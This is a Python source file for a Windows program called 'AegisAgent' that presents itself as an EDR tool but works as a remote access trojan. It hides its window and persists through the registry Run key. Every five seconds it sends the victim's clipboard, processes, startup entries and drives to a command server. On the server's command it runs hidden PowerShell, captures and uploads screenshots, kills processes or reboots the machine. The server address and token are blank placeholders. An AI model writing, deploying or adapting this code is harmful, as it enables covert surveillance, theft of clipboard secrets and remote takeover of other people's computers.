import customtkinter as ctk
import threading
import time
import requests
import psutil
import socket
import os
import sys
import winreg
import subprocess
import io
import base64
import platform
import pyperclip
from PIL import ImageGrab

SERVER_IP = "0.0.0.0"
SERVER_PORT = 0000
API_TOKEN = ""

BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"
ctk.set_appearance_mode("Dark")

class AegisAgent(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.hostname = socket.gethostname()
        self.os_version = f"{platform.system()} {platform.release()}"
        self.pid = os.getpid()
        self.cmd_buffer = None
        self.proc_list = []
        self.last_clipboard = ""
        self.setup_persistence()
        self.withdraw()
        threading.Thread(target=self.loop, daemon=True).start()

    def setup_persistence(self):
        try:
            path = os.path.abspath(sys.argv[0])
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "AegisEDR", 0, winreg.REG_SZ, path)
            winreg.CloseKey(k)
        except: pass

    def exec_shell(self, c):
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            r = subprocess.run(["powershell", "/c", c], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
            self.cmd_buffer = f"CMD> {c}\n{r.stdout + r.stderr}"
        except Exception as e: self.cmd_buffer = f"ERR: {e}"

    def get_procs(self):
        pl = []
        for p in psutil.process_iter(['pid', 'name', 'username']):
            try: pl.append(p.info)
            except: pass
        self.proc_list = pl[:50] 

    def kill_proc(self, pid):
        try: psutil.Process(int(pid)).kill(); self.cmd_buffer = f"Killed PID {pid}"
        except Exception as e: self.cmd_buffer = f"Kill Fail: {e}"

    def check_clipboard(self):
        try:
            curr = pyperclip.paste()
            if curr != self.last_clipboard:
                self.last_clipboard = curr
                return curr
        except: pass
        return None

    def get_startup(self):
        p = []
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
            for i in range(winreg.QueryInfoKey(k)[1]): p.append(winreg.EnumValue(k, i)[0])
        except: pass
        return ", ".join(p)

    def get_drives(self):
        d = []
        for p in psutil.disk_partitions():
            if 'removable' in p.opts: d.append(p.device)
        return ", ".join(d)

    def loop(self):
        while True:
            try:
                clip_data = self.check_clipboard()
                
                payload = {
                    'token': API_TOKEN,
                    'hostname': self.hostname,
                    'device_type': 'desktop',
                    'os_version': self.os_version,
                    'ip': socket.gethostbyname(self.hostname),
                    'public_ip': "0.0.0.0",
                    'cpu': psutil.cpu_percent(),
                    'ram': psutil.virtual_memory().percent,
                    'cmd_output': self.cmd_buffer,
                    'processes': self.proc_list,
                    'clipboard': clip_data,
                    'startup': self.get_startup(),
                    'drives': self.get_drives()
                }
                if self.cmd_buffer: self.cmd_buffer = None
                self.proc_list = []

                r = requests.post(f"{BASE_URL}/api/heartbeat", json=payload, timeout=5)
                if r.status_code == 200:
                    d = r.json()
                    if d.get('command'):
                        c = d['command']
                        if c == 'screenshot':
                            s = ImageGrab.grab()
                            b = io.BytesIO()
                            s.save(b, format="PNG")
                            requests.post(f"{BASE_URL}/api/upload_screenshot", json={'hostname': self.hostname, 'image_data': base64.b64encode(b.getvalue()).decode()})
                        elif c == 'restart': os.system("shutdown /r /t 0")
                        elif c == 'ps_list': self.get_procs()
                        elif c.startswith('kill:'): self.kill_proc(c.split(':')[1])
                        elif c.startswith('shell:'): threading.Thread(target=self.exec_shell, args=(c.split(':',1)[1],)).start()
            except: pass
            time.sleep(5)

if __name__ == "__main__":
    app = AegisAgent()
    app.mainloop()